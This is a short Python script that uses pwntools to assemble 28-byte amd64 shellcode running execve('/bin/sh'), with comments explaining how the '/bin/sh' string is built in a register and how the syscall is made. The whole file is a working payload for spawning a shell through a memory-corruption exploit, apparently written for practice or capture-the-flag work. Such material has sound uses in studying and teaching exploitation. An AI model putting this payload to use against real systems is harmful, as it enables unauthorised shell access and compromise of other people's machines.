from pwn import *

# Shellcode for execve("/bin/sh",0,0)
context.arch = "amd64"
shellcode = """
xor rax, rax
push rax
push rax
pop rsi
pop rdx
mov rcx, 0x68732f6e69622f41             # moving "A/bin/sh" into rcx
shr rcx, 0x8                            # shifting rcx towards right to make "A/bin/sh" to "/bin/sh\x00"
push rcx
push rsp
pop rdi
mov al, 0x3b                            # syscall number for execve()
syscall
"""

shellcode = asm(shellcode)
log.info(f"bytes of the shellcode: {shellcode}")            
log.info(f"lenght of the shellcode: {len(shellcode)}")        # 28 bytes shellcode
